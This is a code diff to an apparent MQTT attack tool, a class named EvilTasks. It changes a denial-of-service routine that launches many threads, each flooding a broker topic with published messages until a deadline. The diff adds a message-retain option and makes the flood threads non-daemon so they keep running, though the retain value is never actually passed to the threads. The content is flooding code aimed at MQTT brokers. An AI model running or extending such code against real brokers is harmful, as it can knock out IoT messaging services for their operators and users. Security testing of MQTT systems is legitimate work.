@@ -191,7 +191,7 @@ class EvilTasks:
 
 
 	#DoS attack task for each thread
-	def DoS_task(self, client_id, config, end_time, protocol):
+	def DoS_task(self, client_id, config, end_time, protocol, retain=False):
 		
 		topic = config["Topic"]
 		qos = int(config["QoS"])
@@ -200,13 +200,14 @@ class EvilTasks:
 		publisher = self.MQTT_object.mqtt_register_client(client_id, protocol)
 
 		while publisher is not None and time.time() < end_time:
-			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload)
+			self.MQTT_object.mqtt_publish_msg(publisher, topic, qos, payload, retain)
+			#time.sleep(0.1) ->small test
 			time.sleep(publish_interval)
 
 
 
 	#Spawn num_clients threads and each one of them makes a DoS_task
-	def DoS_attack(self, config, protocol):
+	def DoS_attack(self, config, protocol, retain):
 		
 		num_clients = int(config["NumClients"])
 		duration = float(config["Duration"])
@@ -217,6 +218,6 @@ class EvilTasks:
 
 		for i in range(num_clients):
 			thread = threading.Thread(target=self.DoS_task, args=(f"dos_client_{i}", config, end_time, protocol))
-			thread.daemon = True
+			thread.daemon = False
 			self.MQTT_object.working_threads.append(thread)
 			thread.start()
